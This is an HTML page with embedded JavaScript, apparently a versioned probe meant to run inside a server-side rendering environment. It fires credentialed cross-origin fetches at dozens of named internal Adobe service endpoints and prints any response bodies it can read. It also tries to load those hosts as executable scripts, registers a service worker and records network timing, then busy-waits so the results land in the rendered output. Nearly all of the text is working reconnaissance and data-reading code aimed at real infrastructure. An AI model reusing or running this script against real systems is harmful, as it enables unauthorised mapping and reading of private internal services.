<html><body style="background:#fff;color:#000;font-family:monospace;font-size:9px;margin:4px;line-height:1.15;">
<b>v11 CORSFetch+ScriptSrc</b>
<pre id="r" style="color:#000;white-space:pre-wrap;word-break:break-all;margin:0;"></pre>
<div id="s"></div>
<script>
var R=document.getElementById('r');
function L(s){R.textContent+=s+'\n';}

L('v11 Cores:'+navigator.hardwareConcurrency);

// === CORS-MODE FETCH (if any internal svc allows CORS, we read full response!) ===
var targets=[
  ['https://senseicore-ue1.adobe.io/','sensei'],
  ['https://senseicore-ue1.adobe.io/health','sensei-h'],
  ['https://senseicore-ue1.adobe.io/services/v2/predict','sensei-p'],
  ['https://dc-argus.adobe.io/','argus'],
  ['https://dc-argus.adobe.io/health','argus-h'],
  ['https://dc-argus.adobe.io/api/v1/status','argus-st'],
  ['https://platform-cs-jpn3.adobe.io/','platcs'],
  ['https://platform-cs-jpn3.adobe.io/health','platcs-h'],
  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/','genai'],
  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/health','genai-h'],
  ['https://dc-graph-proxy.adobe.io/','graphprx'],
  ['https://dc-graph-proxy.adobe.io/health','graphprx-h'],
  ['https://dcdiscovery.adobe.io/','disc'],
  ['https://dcdiscovery.adobe.io/health','disc-h'],
  ['https://dc-api-v2-jpn3.adobe.io/','dcapi'],
  ['https://dc-api-v2-jpn3.adobe.io/health','dcapi-h'],
  ['https://platform-cs-edge-jpn3.adobe.io/','edge'],
  ['https://pdfnow.adobe.io/','pdfnow'],
  ['https://pdfnow.adobe.io/health','pdfnow-h']
];

// Fire ALL fetch probes simultaneously with CORS mode
targets.forEach(function(t){
  // Default mode (cors) - will succeed if server sends CORS headers
  fetch(t[0],{mode:'cors',credentials:'include'}).then(function(resp){
    var cors=resp.headers.get('access-control-allow-origin');
    R.textContent+=t[1]+': s='+resp.status+' type='+resp.type+' cors='+cors+'\n';
    if(resp.type!=='opaque'&&resp.status>0){
      resp.text().then(function(body){
        R.textContent+=t[1]+' BODY('+body.length+'): '+body.substring(0,500)+'\n';
      });
    }
  }).catch(function(e){
    R.textContent+=t[1]+': CORS-ERR '+e.message+'\n';
  });

  // Also try no-cors to see if request reaches
  fetch(t[0],{mode:'no-cors'}).then(function(resp){
    R.textContent+=t[1]+'-nc: type='+resp.type+'\n';
  }).catch(function(e){
    R.textContent+=t[1]+'-nc: ERR '+e.message+'\n';
  });
});

// === FETCH TO INTERESTING PATHS (might have CORS) ===
var extraPaths=[
  ['https://senseicore-ue1.adobe.io/api/','sensei-api'],
  ['https://senseicore-ue1.adobe.io/version','sensei-ver'],
  ['https://senseicore-ue1.adobe.io/status','sensei-stat'],
  ['https://senseicore-ue1.adobe.io/metrics','sensei-metr'],
  ['https://dc-argus.adobe.io/api/','argus-api'],
  ['https://dc-argus.adobe.io/version','argus-ver'],
  ['https://dc-argus.adobe.io/metrics','argus-metr'],
  ['https://platform-cs-jpn3.adobe.io/api/','platcs-api'],
  ['https://platform-cs-jpn3.adobe.io/version','platcs-ver'],
  ['https://platform-cs-jpn3.adobe.io/metrics','platcs-metr'],
  ['https://dcdiscovery.adobe.io/1785845424/index','disc-idx'],
  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/api/','genai-api'],
  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/version','genai-ver']
];

extraPaths.forEach(function(t){
  fetch(t[0],{mode:'cors'}).then(function(resp){
    R.textContent+=t[1]+': s='+resp.status+' type='+resp.type+'\n';
    if(resp.type!=='opaque'&&resp.status>0){
      resp.text().then(function(body){
        R.textContent+=t[1]+' BODY('+body.length+'): '+body.substring(0,400)+'\n';
      });
    }
  }).catch(function(e){
    R.textContent+=t[1]+': '+e.message.substring(0,60)+'\n';
  });
});

// === SCRIPT SRC (if response is JS, it executes in our context) ===
L('\n== ScriptSrc ==');
var S=document.getElementById('s');
var scriptTargets=[
  'https://senseicore-ue1.adobe.io/',
  'https://dc-argus.adobe.io/',
  'https://dcdiscovery.adobe.io/',
  'https://dc-graph-proxy.adobe.io/',
  'https://platform-cs-jpn3.adobe.io/'
];

// Capture errors from script loading
window.onerror=function(msg,src,line,col,err){
  R.textContent+='SCRIPT_ERR: '+msg+' src='+src+' line='+line+'\n';
  return true;
};

scriptTargets.forEach(function(url){
  var sc=document.createElement('script');
  sc.src=url;
  sc.crossOrigin='anonymous';
  sc.onerror=function(){R.textContent+='script-err: '+url.substring(8,40)+'\n';};
  sc.onload=function(){R.textContent+='script-ok: '+url.substring(8,40)+' EXECUTED!\n';};
  S.appendChild(sc);
});

// === SERVICE WORKER ===
L('\n== SW ==');
try{
  navigator.serviceWorker.register('/sw.js').then(function(reg){
    R.textContent+='SW registered: scope='+reg.scope+'\n';
  }).catch(function(e){
    R.textContent+='SW reg err: '+e.message+'\n';
  });
}catch(e){L('SW: '+e.message);}

// === REPORTING OBSERVER ===
try{
  var ro=new ReportingObserver(function(reports){
    reports.forEach(function(r){
      R.textContent+='REPORT: type='+r.type+' url='+r.url+' body='+JSON.stringify(r.body).substring(0,200)+'\n';
    });
  },{types:['deprecation','intervention','crash'],buffered:true});
  ro.observe();
}catch(e){L('RO: '+e.message);}

// === PERFORMANCE OBSERVER (catch resource timing for all fetches) ===
try{
  var po=new PerformanceObserver(function(list){
    list.getEntries().forEach(function(e){
      if(e.name.indexOf('github')>-1||e.entryType!=='resource')return;
      var n=e.name.replace('https://','').substring(0,50);
      R.textContent+='PERF '+n+' dns='+(e.domainLookupEnd-e.domainLookupStart).toFixed(0)+' tcp='+(e.connectEnd-e.connectStart).toFixed(0)+' ttfb='+(e.responseStart-e.requestStart).toFixed(0)+' sz='+e.transferSize+'\n';
    });
  });
  po.observe({type:'resource',buffered:true});
}catch(e){L('PO: '+e.message);}

// === BUSY WAIT (async results fire AFTER this) ===
L('\n== Wait 10s ==');
var start=Date.now();
while(Date.now()-start<10000){}
L('BusyDone t='+(Date.now()-start)+'ms');
</script>
</body></html>
